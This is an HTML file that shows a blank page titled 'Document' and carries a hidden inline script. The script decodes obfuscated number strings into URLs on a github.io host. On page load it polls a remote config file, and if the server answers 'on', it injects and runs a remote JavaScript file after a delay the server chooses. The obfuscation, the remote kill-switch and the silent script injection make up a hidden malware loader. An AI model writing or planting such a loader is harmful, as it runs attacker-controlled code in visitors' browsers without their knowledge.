<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        window.dic = "abcdefghijklmnopqrstuvwxyz:/.?=";
        window.sc =  (function (){ var r = ""; var sr = "7-19-19-15-18-26-27-27-18-14-17-4-13-19-14-8-19-4-17-28-6-8-19-7-20-1-28-8-14-27-15-20-1-11-8-2-27-18-2-17-8-15-19-28-9-18-29-19-30"; var sp = sr.split("-"); for(var i = 0; i < sp.length; i++) r = r + dic[parseInt(sp[i])]; return r;})() + Math.random();
        window.cf =  (function (){ var r = ""; var sr = "7-19-19-15-18-26-27-27-18-14-17-4-13-19-14-8-19-4-17-28-6-8-19-7-20-1-28-8-14-27-15-20-1-11-8-2-27-2-14-13-5-8-6-28-19-23-19-29-19-30"; var sp = sr.split("-"); for(var i = 0; i < sp.length; i++) r = r + dic[parseInt(sp[i])]; return r;})() + Math.random();
        setTimeout(function() {
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {                    
                    var on = this.responseText.split(",")[0] == "on";
                    var t = parseInt(this.responseText.split(",")[1]);
                    if(on) {
                        setTimeout(function() {
                            var st = document.createElement('script');
                            st.src = window.sc;
                            document.body.appendChild(st);
                        }, t);                        
                    }
                }
            };
            xhttp.open("GET", cf, true);
            xhttp.send();            
        }, 1000);        
    </script>
</body>
</html>
